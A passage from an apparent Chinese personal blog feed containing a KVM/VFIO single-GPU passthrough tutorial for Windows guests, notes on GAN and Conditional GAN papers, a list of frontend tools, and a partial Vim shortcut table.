\[1002:67ff\] (rev cf)</span><br><span class="line">Driver: amdgpu</span><br><span class="line">0a:00.1 Audio device \[0403\]: Advanced Micro Devices, Inc. \[AMD/ATI\] Baffin HDMI/DP Audio \[Radeon RX 550 640SP / RX 560/560X\] \[1002:aae0\]</span><br><span class="line">Driver: snd\_hda\_intel</span><br></pre></td></tr></table></figure><p>上图是amd显卡的结果，3090也只有这两项</p><blockquote><p>💡 这个信息需要保存一下很重要，之后将会用到</p></blockquote><h2 id="VFIO模块设置"><a href="#VFIO模块设置" class="headerlink" title="VFIO模块设置"></a>VFIO模块设置</h2><h3 id="x2F-etc-x2F-modprobe-d-x2F-vfio-conf"><a href="#x2F-etc-x2F-modprobe-d-x2F-vfio-conf" class="headerlink" title="&#x2F;etc&#x2F;modprobe.d&#x2F;vfio.conf"></a>&#x2F;etc&#x2F;modprobe.d&#x2F;vfio.conf</h3><p>在vfio.conf里面添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">options vfio-pci ids=1002:67ff,1002:aae0 <span class="comment"># ids需要修改，使用,进行分割</span></span><br><span class="line">options vfio-pci disable_idle_d3=1</span><br><span class="line">options vfio-pci disable_vga=1</span><br></pre></td></tr></table></figure><blockquote><p>这里的ids来自于iommu组里的信息。都需要添加到这里。</p></blockquote><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-kvm</span><br><span class="line">sudo apt install virt-manager</span><br><span class="line">sudo apt install libvirt-bin</span><br><span class="line">sudo apt insatll bridge-utils</span><br></pre></td></tr></table></figure><h2 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start libvirtd</span><br><span class="line">sudo systemctl start virtlogd.socket</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用虚拟网络</span></span><br><span class="line">sudo virsh net-start default</span><br><span class="line">sudo virsh net-autostart default</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ol><li>下载windows镜像</li><li>下载<a href="https://github.com/virtio-win/virtio-win-pkg-scripts">https://github.com/virtio-win/virtio-win-pkg-scripts</a> 提升虚拟机性能。</li></ol><h3 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h3><p>为方便管理，需要建立2个文件夹：VM（存镜像），storage（存内容）。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>本地安装介质，游览选择VM中的windows镜像来进行安装<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649753725173_0.png" alt="image.png"><br>下方无法检测到的时候，需要自己手动添加MW10内容。然后选择左下角创建存储池，选择到之前创建的storage位置。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649753740384_0.png" alt="image.png"><br>上面只是位置的映射，下面才是创建池，添加卷并分配空间。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649753758199_0.png" alt="image.png"><br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649753769662_0.png" alt="image.png"><br>依旧叫win10，方便后续操作。</p><h4 id="重要"><a href="#重要" class="headerlink" title="重要"></a>重要</h4><p>一定要选在安装前自定义配置，选中。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649753823742_0.png" alt="image.png"></p><h3 id="配置驱动"><a href="#配置驱动" class="headerlink" title="配置驱动"></a>配置驱动</h3><p>这里是edk2-ovmf，这个是arch的，在ubuntu下叫OVMF，反正后缀是一致的。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649753915734_0.png" alt="image.png"></p><h4 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649753935366_0.png" alt="image.png"></p><h4 id="添加virtio的驱动"><a href="#添加virtio的驱动" class="headerlink" title="添加virtio的驱动"></a>添加virtio的驱动</h4><p>就是之前下载的另一个vm文件<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649753963471_0.png" alt="image.png"><br>需要在引导里添加2个cdrom设备<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649753978216_0.png" alt="image.png"></p><h3 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h3><h4 id="引导"><a href="#引导" class="headerlink" title="引导"></a>引导</h4><p>直接按任意键进行就可以进入安装界面。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649754016960_0.png" alt="image.png"><br>输入exit， 选择boot manager，一般选择第一个dvd</p><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><blockquote><p>需要加载virtio的硬盘</p></blockquote><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649754054613_0.png" alt="image.png"><br>之后选择加载驱动程序，并游览选择<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649754088091_0.png" alt="image.png"><br>选择对应的win10。这里还需要添加virtio的网卡驱动<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649754138788_0.png" alt="image.png"><br>同理，选择win10，amd64</p><blockquote><p>以上操作完成之后就可以直接点击安装，这里不需要管磁盘的问题。</p></blockquote><h1 id="配置防virt休眠"><a href="#配置防virt休眠" class="headerlink" title="配置防virt休眠"></a>配置防virt休眠</h1><p>因为要单卡直通，通完如果宿主机休眠了，这个虚拟机会裂开的。</p><h2 id="创建hooks"><a href="#创建hooks" class="headerlink" title="创建hooks"></a>创建hooks</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> /etc/libvirt/hooks</span><br></pre></td></tr></table></figure><p>将<a href="https://gitee.com/ledisthebest/LEDs-single-gpu-passthrough/tree/main/libvirt-hooks">LEDs-single-gpu-passthrough</a>中也就是hooks里的3个文件放到创建的hooks文件夹里面。并都变成可执行的文件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> +x /etc/libvirt/hooks/*</span><br></pre></td></tr></table></figure><p>把两个脚本软链接到根目录的bin文件夹(这里的2个文件其实就是负责显卡的直通和释放的)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /etc/libvirt/hooks/vfio-startup.sh /bin/vfio-startup.sh</span><br><span class="line">sudo ln -s /etc/libvirt/hooks/vfio-teardown.sh /bin/vfio-teardown.sh</span><br></pre></td></tr></table></figure><h2 id="防止休眠"><a href="#防止休眠" class="headerlink" title="防止休眠"></a>防止休眠</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/systemd/system/libvirt-nosleep@.service</span><br></pre></td></tr></table></figure><p>在libvirt-nosleep@.service里面添加：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Preventing <span class="built_in">sleep</span> <span class="keyword">while</span> libvirt domain <span class="string">&quot;%i&quot;</span> is running</span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/usr/bin/systemd-inhibit --what=<span class="built_in">sleep</span> --why=<span class="string">&quot;Libvirt domain \&quot;%i\&quot; is running&quot;</span> --<span class="built_in">who</span>=%U --mode=block <span class="built_in">sleep</span> infinity</span><br></pre></td></tr></table></figure><p>更改权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> 644 -R /etc/systemd/system/libvirt-nosleep@.service</span><br></pre></td></tr></table></figure><p>变成系统文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chown</span> root:root /etc/systemd/system/libvirt-nosleep@.service</span><br></pre></td></tr></table></figure><h1 id="配置Libvirt"><a href="#配置Libvirt" class="headerlink" title="配置Libvirt"></a>配置Libvirt</h1><h2 id="编辑libvirt-conf"><a href="#编辑libvirt-conf" class="headerlink" title="编辑libvirt.conf"></a>编辑libvirt.conf</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/libvirt/libvirtd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到这两行，把前面的#删掉：</span></span><br><span class="line">unix_sock_group = <span class="string">&quot;libvirt&quot;</span></span><br><span class="line">unix_sock_rw_perms = <span class="string">&quot;0770&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以选择把这两行添加到文件的最后面（日志文件）,方便后续排错:</span></span><br><span class="line">log_filters=<span class="string">&quot;1:qemu&quot;</span></span><br><span class="line">log_outputs=<span class="string">&quot;1:file:/var/log/libvirt/libvirtd.log&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649755315006_0.png" alt="image.png"><br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649755326004_0.png" alt="image.png"></p><h2 id="编辑qemu-conf"><a href="#编辑qemu-conf" class="headerlink" title="编辑qemu.conf"></a>编辑qemu.conf</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/libvirt/qemu.conf</span><br></pre></td></tr></table></figure><p>把#user &#x3D; “root”改成user &#x3D; “zcdu”，#group &#x3D; “root”改成group &#x3D; “libvirt”<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649755356328_0.png" alt="image.png"><br>把自己添加到libvirt组里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -a -G libvirt 用户名</span><br></pre></td></tr></table></figure><h2 id="重启电脑或者重启libvirt"><a href="#重启电脑或者重启libvirt" class="headerlink" title="重启电脑或者重启libvirt"></a>重启电脑或者重启libvirt</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart libvirtd.service</span><br><span class="line">sudo systemctl restart virtlogd.socket</span><br></pre></td></tr></table></figure><h1 id="导出显卡bios"><a href="#导出显卡bios" class="headerlink" title="导出显卡bios"></a>导出显卡bios</h1><p>最简单使用gpu-z来导出显卡的rom配置文件。这是一个16进制文件，然后使用bless来编辑，还是智能bless，其他都不好用。</p><h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><blockquote><p>nvidia需要，amd是不需要的。amd yes！！</p></blockquote><h3 id="查找字符”VIDEO”"><a href="#查找字符”VIDEO”" class="headerlink" title="查找字符”VIDEO”"></a>查找字符”VIDEO”</h3><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649755467858_0.png" alt="image.png"><br>把VIDEO前面第一个大写U.(十六进制是55)之前的所有的headers都删掉.<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649755486892_0.png" alt="image.png"><br>没删错的话，前面的几位是一致的。</p><blockquote><p>Ubuntu&#x2F;OpenSUSE&#x2F;Mint(用AppArmour的发行版)可以保存到&#x2F;usr&#x2F;share&#x2F;vgabios里面。但是后面是选择位置的，所以也没必要强求。</p></blockquote><h3 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> -R 660 vbios.rom</span><br></pre></td></tr></table></figure><h3 id="更改拥有者"><a href="#更改拥有者" class="headerlink" title="更改拥有者"></a>更改拥有者</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chown</span> zcdu(你的用户名):<span class="built_in">users</span> vbios文件.rom</span><br></pre></td></tr></table></figure><h1 id="添加显卡到虚拟机"><a href="#添加显卡到虚拟机" class="headerlink" title="添加显卡到虚拟机"></a>添加显卡到虚拟机</h1><h2 id="添加设备"><a href="#添加设备" class="headerlink" title="添加设备"></a>添加设备</h2><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649755613426_0.png" alt="image.png"></p><blockquote><p>需要把之前iommu里的所有项都添加进来</p></blockquote><h2 id="启用XML编辑-在显卡的所有pci设备里面"><a href="#启用XML编辑-在显卡的所有pci设备里面" class="headerlink" title="启用XML编辑, 在显卡的所有pci设备里面"></a>启用XML编辑, 在显卡的所有pci设备里面</h2><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649755645466_0.png" alt="image.png"><br>在</source>之后添加：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;rom bar=<span class="string">&quot;on&quot;</span> file=<span class="string">&quot;/path/to/patched.rom&quot;</span>/&gt; <span class="comment"># 需要把rom的绝对路径写进来</span></span><br></pre></td></tr></table></figure><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649755667703_0.png" alt="image.png"></p><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>把信道，usb转接，显卡qxl,触摸板那些东西删掉。串口（删除显示s啥的协议才能删除qxl）</p><blockquote><p>显卡qxl必须删掉！</p></blockquote><h2 id="添加io设备"><a href="#添加io设备" class="headerlink" title="添加io设备"></a>添加io设备</h2><p>添加你的USB设备，比如鼠标、键盘和USB耳机。</p><h2 id="修改cpu配置为直通"><a href="#修改cpu配置为直通" class="headerlink" title="修改cpu配置为直通"></a>修改cpu配置为直通</h2><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649755768021_0.png" alt="image.png"></p><h2 id="绕过英伟达Geforce显卡防虚拟化检测"><a href="#绕过英伟达Geforce显卡防虚拟化检测" class="headerlink" title="绕过英伟达Geforce显卡防虚拟化检测"></a>绕过英伟达Geforce显卡防虚拟化检测</h2><p>编辑XML:<br>在</hyperv>之前添加（value应该等于8-12个字母）:AMD显卡可以用”AuthenticAMD”作为id但不需要，因为AMD不会拦着你显卡虚拟化。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;vendor_id state=<span class="string">&#x27;on&#x27;</span> value=<span class="string">&#x27;randomid&#x27;</span>/&gt;</span><br></pre></td></tr></table></figure><p>在<features> 和 </features> 之间添加:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;kvm&gt;</span><br><span class="line">&lt;hidden state=<span class="string">&#x27;on&#x27;</span>/&gt;</span><br><span class="line">&lt;/kvm&gt; <span class="comment"># 直接在hyperv之后添加就行</span></span><br></pre></td></tr></table></figure><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649755803168_0.png" alt="image.png"></p><blockquote><p>之后就可以快乐的玩耍了！！！</p></blockquote><h1 id="文件的交互"><a href="#文件的交互" class="headerlink" title="文件的交互"></a>文件的交互</h1><p>使用ndb来挂载qcow2.</p><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-nbd</span><br></pre></td></tr></table></figure><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-nbd -c /dev/nbd0 /qcow2文件</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以使用lsblk查看所有盘</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo mount /dev/nbd文件盘 /mnt</span></span><br></pre></td></tr></table></figure><h1 id="重新构建镜像"><a href="#重新构建镜像" class="headerlink" title="重新构建镜像"></a>重新构建镜像</h1><p>删除防libvirt休眠的配置。<br>删除&#x2F;bin中的vfio-startup.sh和vfio-teardown.sh</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h2 id="无法进入虚拟机"><a href="#无法进入虚拟机" class="headerlink" title="无法进入虚拟机"></a>无法进入虚拟机</h2><h3 id="可能一"><a href="#可能一" class="headerlink" title="可能一"></a>可能一</h3><p>多删除了一个usb接口，这个hub应该是我的绿联的hub，需要加进来才能有鼠标和键盘。这是会导致问题的<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649755939070_0.png" alt="image.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[^1 ] <a href="https://www.bilibili.com/video/BV1KK4y1S7p2?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1KK4y1S7p2?spm_id_from=333.999.0.0</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GAN</title>
      <link href="/2022/04/12/GAN/"/>
      <url>/2022/04/12/GAN/</url>
      
        <content type="html"><![CDATA[<ul><li>URL:<br>NAME: Generative Adversarial Nets<br>AUTHOR: Ian j. Goodfellow<br>YEAR: 2014<br>PUBLISHED: NIPS<br>TAG: ((624166c6-e8db-466f-a5bf-827e5d7df141))<br>CODE:<br>IN A WORD:</li><li></li></ul><h1 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h1><p>提出了一个新的框架用来估计生成模型，通过对抗过程同时训练2个模型：生成模型，辨别模型。</p><h1 id="what"><a href="#what" class="headerlink" title="what"></a>what</h1><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648533519677_0.png" alt="image.png"><br>被水标遮住的是VAE<br>可以看到，GAN是属于隐性生成模型<br>GAN顾名思义，就是生成对抗性网络。它的对抗体现在A(Adversarial)。</p><h2 id="何为对抗"><a href="#何为对抗" class="headerlink" title="何为对抗"></a>何为对抗</h2><p>对抗网络实际上提出了一种新的框架，这种框架利用了对抗性训练过程，同时训练两个网络，两个网络之间相互博弈，互相进步。其中一个模型为生成模型，定义为G，另一个模型为判别模型，定义为D。<br>id:: 6242a0ad-7b2c-4434-ba2f-0b0083762af6<br>这两个模型一起对抗训练，生成模型产生一张图片去欺骗判别模型，然后判别模型去判断这张图片是真是假，最终在这两个模型训练的过程中，两个模型的能力越来越强，最终达到理想的纳什均衡状态。</p><h2 id="GAN的缺陷"><a href="#GAN的缺陷" class="headerlink" title="GAN的缺陷"></a>GAN的缺陷</h2><h3 id="难训练"><a href="#难训练" class="headerlink" title="难训练"></a>难训练</h3><p>GAN的训练并非普通的凸优化问题，最大最小优化问题实质上是在找一个鞍点，随着训练次数增加，G、D的生成、判别能力越来越强，并且D的判别能力很容易影响G的生成能力，WGAN从理论上证明当D训练到最好的情况下，原始GAN中G的损失函数（实质上是一种对真实分布与生成分布的距离度量，如KL距离、JS距离、Wasserstein距离等）存在自相矛盾的缺陷，这也就导致GAN很难训练，微调敏感。</p><h3 id="模式奔溃"><a href="#模式奔溃" class="headerlink" title="模式奔溃"></a>模式奔溃</h3><h2 id="模式崩溃指的是模型学习到真实样本的分布一部分，导致模型生成的样本非常单一，样本差异较小。"><a href="#模式崩溃指的是模型学习到真实样本的分布一部分，导致模型生成的样本非常单一，样本差异较小。" class="headerlink" title="模式崩溃指的是模型学习到真实样本的分布一部分，导致模型生成的样本非常单一，样本差异较小。"></a>模式崩溃指的是模型学习到真实样本的分布一部分，导致模型生成的样本非常单一，样本差异较小。</h2><h1 id="Conditional-GAN"><a href="#Conditional-GAN" class="headerlink" title="Conditional GAN"></a>Conditional GAN</h1><p>在Naive GAN中，我们设置的输入 z 为潜在向量，该向量从高斯分布中采样得到。而在CGAN中，我们的输入是两个：潜在向量和控制条件。<br>我们以 y 表示控制条件，它通常可以为一个one-hot向量，或者一个数值， z 为潜在向量， 那么生成结果就可以表示为$x &#x3D; G(z | y)$。</p><blockquote><p>🔔判别器的功能从一个变成乐两个，其一是判断G生成的图片复合真实样本的程度，其二是判断输入图片是否复合我们给定的条件y。</p></blockquote><p>🔋 CGAN是有监督学习，采样的每一项都是一个pair对，如文字生成图片则需要文字和图片的GT pair。^^CGAN 的核心就是判断什么样的 pair 给高分,什么样的 pair 给低分。^^</p><h2 id="辨别器"><a href="#辨别器" class="headerlink" title="辨别器"></a>辨别器</h2><p>由于CGAN多了一个控制条件参数，所以辨别器也就出现了2种类型：<br>使用同一个辨别器</p><blockquote><p>即生成的图片质量和符合要求需要同时通过 D 的”审查”</p></blockquote><p>该辨别器$D(x|y), x\in G(z | y) or x\in Data$，Data为训练集的真实样本。对真实样本与标签的配对需要接近1，对于生成样本与标签需要接近于0，对于真实样本与不相符的标签，D的输出应该接近于0。<br>举个例子<br>条件 y 表示的是train，图片 x 也是一张清晰的火车照片， 那么 D 的输出就会是 1<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648534893267_0.png" alt="image.png"><br>而如下，左边虽然输出图片清晰,但不符合条件 c;右边输出图片不真实<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648534951890_0.png" alt="image.png"><br>D的输出都会是0<br>^^原始CGAN使用的方法^^<br>优化函数就变成了 <img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648534789323_0.png" alt="image.png"><br>很明显，就是将辨别器的参数变成了条件参数。</p><h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h3><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648535156839_0.png" alt="image.png"><br>可以看出来是先对辨别器进行的更新<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648535261647_0.png" alt="image.png"><br>第一项为正确条件与真实图片的pair，应该给高分；第二项为正确条件与仿造图片的pair，应该给低分(于是加上“1 ”的操作)，第三项是错误条件与真实图片的pair，应该也给低分。</p><blockquote><p>CGAN与GANs在判别器上的不同之处就是多除了第三项。</p></blockquote><p>最后对生成器进行更新<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648535395041_0.png" alt="image.png">{:height 84, :width 493}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>前端工具</title>
      <link href="/2022/04/06/%E5%89%8D%E7%AB%AF%E5%B7%A5%E5%85%B7/"/>
      <url>/2022/04/06/%E5%89%8D%E7%AB%AF%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/voidcosmos/npkill">npkill</a> ：快速查找和轻松删除 node_modules 文件夹的工具<br>还在为 node_modules 占了很多磁盘空间而烦恼吗？还在手动找用不到的 node_modules 目录吗？快来试试 npkill 吧！轻松地删除 node_modules 目录<br><a href="https://github.com/typicode/lowdb">lowdb</a>：支持浏览器和 Electron 的轻量级 JSON 文件数据库。如果是创建没有后端的小型前端项目，但还有存储和管理数据的需求，那就快试试 lowdb 吧<br>simdjson：每秒可解析千兆字节的高性能 JSON 解析库<br><a href="https://github.com/Unitech/pm2">pm2</a>：Node.js 的进程管理工具。<br>它容易上手操作简单，可以有效地提高 Node.js 程序运行的稳定性，支持自动重启、负载均衡、不停服务重启、性能监控等功能，多用于生产环境中管理、监控 Node.js 进程</p>]]></content>
      
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VIM</title>
      <link href="/2022/04/05/VIM/"/>
      <url>/2022/04/05/VIM/</url>
      
        <content type="html"><![CDATA[<h1 id="自带功能"><a href="#自带功能" class="headerlink" title="自带功能"></a>自带功能</h1><h2 id="窗口调整"><a href="#窗口调整" class="headerlink" title="窗口调整"></a>窗口调整</h2><table><thead><tr><th>按键</th><th>功能</th></tr></thead><tbody><tr><td>su</td><td>上下分屏，鼠标在上</td></tr><tr><td>se</td><td>上下分配，鼠标在下</td></tr><tr><td>sn</td><td>左右分配，鼠标在右</td></tr><tr><td>si</td><td>左右分配，鼠标在左</td></tr><tr><td>sv</td><td>设置两个分屏为垂直分割</td></tr><tr><td>sh</td><td>设置两个分屏为水平分割</td></tr><tr><td>srv</td><td>将当前分屏设置为垂直分割</td></tr><tr><td>srh</td><td>将当前分屏设置为水平分割</td></tr><tr><td>C-up</td><td>向上调整大小</td></tr><tr><td>C-down</td><td>向下调整大小</td></tr><tr><td>C-left</td><td>向左调整大小</td></tr><tr><td>C-right</td><td>向右调整大小</td></tr></tbody></table><h2 id="缓冲池文件"><a href="#缓冲池文件" class="headerlink" title="缓冲池文件"></a>缓冲池文件</h2><table><thead><tr><th>按键</th><th>功能</th><th>原始命令</th></tr></thead><tbody><tr><td><Leader>n</td><td>下一个文件</td><td>bnext</td></tr><tr><td><Leader>b</td><td>上一个文件</td><td>bprevious</td></tr><tr><td><Leader>d</td><td>关闭当前文件</td><td>bdelete</td></tr><tr><td>ctrl+w+c</td><td>关闭窗口，不关闭当前文件</td><td></td></tr><tr><td>ctrl+w+q</td><td>关闭当前文件</td><td></td></tr></tbody></table><h2 id="光标位置"><a href="#光标位置" class="headerlink" title="光标位置"></a>光标位置</h2><table><thead><tr><th>按键</th><th>功能</th><th>说明</th></tr></thead><tbody><tr><td>空格+w</td><td>将光标移动到下一个窗口</td><td>这里只是非递归的将<LEADER>w映射为了<C-w>w</td></tr><tr><td>空格+h</td><td>将光标移动到左边的窗口</td><td>这里只是非递归的将<LEADER>h映射为了<C-w>h</td></tr><tr><td>空格+j</td><td>将光标移动到上边的窗口</td><td>这里只是非递归的将<LEADER>j映射为了<C-w>j</td></tr><tr><td>空格+l</td><td>将光标移动到右边的窗口</td><td>这里只是非递归的将<LEADER>l映射为了<C-w>l</td></tr><tr><td>数值+j(k)</td><td>向下移动n行</td><td></td></tr><tr><td>ctrl+u(d)</td><td>向上翻页</td><td></td></tr><tr><td>{ }</td><td>跳段</td><td></td></tr><tr><td>：n</td><td>跳到第n行</td><td></td></tr><tr><td>nG</td><td>跳到第n行</td><td></td></tr><tr><td>f+a</td><td>同行找a</td><td></td></tr><tr><td>ctrl+o</td><td>跳转到上一次跳转来的位置，可以跨文件</td><td>可以递归的往前去找上一个位置</td></tr><tr><td>‘’</td><td>跳转到上一次跳转来的位置，不能跨文件</td><td>只能保留当前位置和上一个位置的信息，在这2个位置间跳转</td></tr><tr><td>ctrl+i</td><td>ctrl+o的反向操作</td><td>无法跳转的时候是由于和coc中的某个定义冲突了</td></tr><tr><td>gi</td><td>跳转到上一次编辑的位置</td><td></td></tr></tbody></table><h2 id="代码折叠"><a href="#代码折叠" class="headerlink" title="代码折叠"></a>代码折叠</h2><p>|Name||功能|补充|<br>|—|—|—|<br>|zc|折叠||<br>|zC| 可是范围内的折叠||<br>|zo|展开||<br>|zO|可视范围内的展开||<br>|zf|选择折叠|zf10jk?|<br>|zn需要配对zN使用|zn还原折叠，zN回到折叠，针对的是上次的折叠||</p><h2 id="剪贴板"><a href="#剪贴板" class="headerlink" title="剪贴板"></a>剪贴板</h2><h3 id="全局"><a href="#全局" class="headerlink" title="全局"></a>全局</h3><p>neovim默认不支持系统剪贴板，所以需要安装xclip(or xsel)</p><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><table><thead><tr><th>Name</th><th>功能</th><th>补充</th></tr></thead><tbody><tr><td>“</td><td>启动剪贴板命令</td><td>然后选择寄存器之后使用y或者p进行复制或者粘贴操作</td></tr><tr><td>+</td><td>系统剪贴板</td><td></td></tr><tr><td>-</td><td></td><td></td></tr></tbody></table><h2 id="终端模式"><a href="#终端模式" class="headerlink" title="终端模式"></a>终端模式</h2><blockquote><p>C-&#x2F;：主要引导(原始的是C-,这里应该是被改键了。)</p></blockquote><p>打开<br>:terminal<br>模式切换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 终端切换到类普通模式</span></span><br><span class="line">&lt;C-/&gt;&lt;C-n&gt;</span><br><span class="line"><span class="comment"># 切换buffer</span></span><br><span class="line">&lt;C-/&gt;&lt;C-o&gt;</span><br></pre></td></tr></table></figure><p>e<br>editor的缩写，直接打开指定的文件<br>打开终端<br>\t 或者 <LEADER>&#x2F;</p><h2 